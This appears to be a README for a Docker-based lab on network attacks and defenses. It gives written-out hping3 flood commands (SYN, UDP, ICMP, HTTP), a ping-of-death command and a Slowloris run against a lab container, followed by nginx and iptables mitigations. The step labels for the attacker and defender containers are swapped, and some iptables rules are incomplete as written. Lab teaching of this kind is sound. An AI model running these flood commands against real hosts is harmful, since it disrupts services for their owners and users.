1. Create docker network
```bash
docker network create attack-defense-net
```

2. Run defender container

```bash
docker build -t attacker ./attacker
docker run -it --name attacker --network attack-defense-net attacker
```
3. Run attacker container
```bash
docker build -t defender ./defender
docker run -it --name defender --network attack-defense-net -p 8080:80 defender
```

## Attack
Inside attacker container, run the following command to attack defender container
1. Http flood attack
```bash
hping3 --rand-source --flood 172.18.0.2 -p 8000
```
2. TCP SYN flood attack
```bash
hping3 --rand-source -S -q -n --flood 172.18.0.2 -p 8000
```
3. ICMP flood attack
```bash
hping3 --rand-source -1 --flood 172.18.0.2 -p 8000
```
4. Udp flood attack
```bash
hping3 --rand-source --udp --flood 172.18.0.2 -p 8000
```
5. Ping of death attack
```bash
hping3 --icmp -d 65510 -S 172.18.0.2
```
6. Slowloris attack
```bash
python slowloris.py localhost 8000 100
```

## Defense
1. For defending against HTTP flood attack, we can use nginx rate limiting. We can limit the number of requests per second from a single IP address. We can add the following configuration to the nginx configuration file.
```bash
user nginx;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
    worker_connections 1024;
    multi_accept on;
    use epoll;
}

http {
    sendfile on;
    tcp_nopush on;
    tcp_nodelay on;
    keepalive_timeout 65;
    types_hash_max_size 2048;

    include /etc/nginx/mime.types;
    default_type application/octet-stream;

    # Logging settings
    access_log /var/log/nginx/access.log;
    error_log /var/log/nginx/error.log warn;

    # Rate Limiting
    limit_req_zone $binary_remote_addr zone=mylimit:10m rate=10r/s;

    server {
        listen 80;
        server_name _;

        location / {
            root /usr/share/nginx/html;
            index index.html index.htm;

            # Apply rate limiting
            limit_req zone=mylimit burst=20 nodelay;

            # Drop requests with too many args
            if ($args ~* "(&\w+=\w+){10,}") {
                return 444;
            }
        }

        # Protection against common exploits
        location ~* \.(php|jsp|cgi|asp|aspx)$ {
            return 444;
        }

        # Deny access to hidden files
        location ~ /\. {
            deny all;
        }
    }

}
```
2. For defending against TCP SYN flood attack, we can use iptables to limit the number of connections per second from a single IP address. We can add the following rule to the iptables.
```bash
iptables -A INPUT -p tcp --syn --dport 8000 -m connlimit --connlimit-above 10 --connlimit-mask 32 -j REJECT
```
3. For defending against ICMP flood attack, we can use iptables to limit the number of ICMP packets per second from a single IP address. We can add the following rule to the iptables.
```bash
iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s -j ACCEPT
```
4. For defending against UDP flood attack, we can use iptables to limit the number of UDP packets per second from a single IP address. We can add the following rule to the iptables.
```bash
iptables -A INPUT -p udp --dport 8000 -m limit --limit 1/s -j ACCEPT
```
5. For defending against Ping of death attack, we can use iptables to limit the size of the ICMP packets. We can add the following rule to the iptables.
```bash
iptables -A INPUT -p icmp --icmp-type echo-request -m length --length 65510:65535 -j DROP
```
6. For defending against Slowloris attack, we can use nginx to limit the number of connections per second from a single IP address. We can add the following configuration to the nginx configuration file.
```bash
http {
    # Limits the time Nginx tries to read the client header
    client_header_timeout 10s;  # Adjust time as needed

    # Limits the time a client has to send a request to the server
    client_body_timeout 10s;

    # Controls how long a keep-alive client connection will stay open on the server side.
    keepalive_timeout 20s;  # Lower this if you do not need long persistent connections

    # The single connection limit
    limit_conn_zone $binary_remote_addr zone=perip:10m;
    limit_conn perip 10;  # Limits the number of connections per IP address

    server {
        listen 80;

        # Apply the connection limit per IP
        limit_conn perip 10;

        location / {
            root /usr/share/nginx/html;
            index index.html index.htm;
        }
    }
}
```
also we can use iptables to limit the number of connections per second from a single IP address. We can add the following rule to the iptables.
```bash
iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --set
iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --update --seconds 60 --hitcount 15 -j DROP

```
## Conclusion
In conclusion, this project demonstrates how to set up a simulated environment for executing and defending against various types of network attacks using Docker, Python, and Nginx. The attacks include HTTP flood, TCP SYN flood, ICMP flood, UDP flood, Ping of Death, and Slowloris. 

The defenses involve techniques such as rate limiting, connection limiting, packet size limiting, and limiting the number of connections per IP address. These defenses are implemented using Nginx configurations and iptables rules.

This project serves as a practical guide for understanding the nature of these attacks and how to mitigate them. It's important to note that the effectiveness of these defenses may vary depending on the specific circumstances and configurations of your network. Always ensure to test and adjust these settings as necessary in a controlled environment before deploying them in a production setting.

Remember, the best defense is a good offense. Understanding these attacks and how they work is the first step in securing your network against them.